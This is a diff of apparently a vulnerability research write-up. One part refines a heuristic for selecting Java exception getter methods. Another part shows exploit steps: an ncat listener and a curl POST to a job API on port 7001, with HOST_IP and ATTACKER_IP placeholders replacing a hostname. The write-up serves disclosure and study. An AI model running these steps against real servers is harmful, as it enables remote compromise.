@@ -347,13 +347,17 @@ Now here is a recreation of my next thoughts... These "get%" patterned Exception
 Hence my final Heuristic is-
 
 - The method name should not be `getStackTrace`, `getSuppressed`, since they return useless things  
-AND  
-(  
+
+AND 
+
+(
+
 - The method name should follow the pattern `get%` or `Get%` or be `toString`
 
 OR
 
-- The method should be a `GetterMethod`, though this doesn't gice any results in our case there is still that very very small possibility it might work somewhere, someday.
+- The method should be a `GetterMethod`, though this doesn't gice any results in our case there is still that very very small possibility it might work somewhere, someday.  
+
 )
 
 Withough further ado, here is the new class that was added-
@@ -499,7 +503,7 @@ ncat -k -l -p 2222
 #### Step 2
 Now run this curl request from anywhere and replace HOST_IP and ATTACKER_IP
 ```bash
-    curl --location --request POST 'sinpi.wtf:7001/api/v3/jobs' \
+    curl --location --request POST 'HOST_IP:7001/api/v3/jobs' \
     --header 'Content-Type: application/json' \
     --data-raw '{
         "container": {
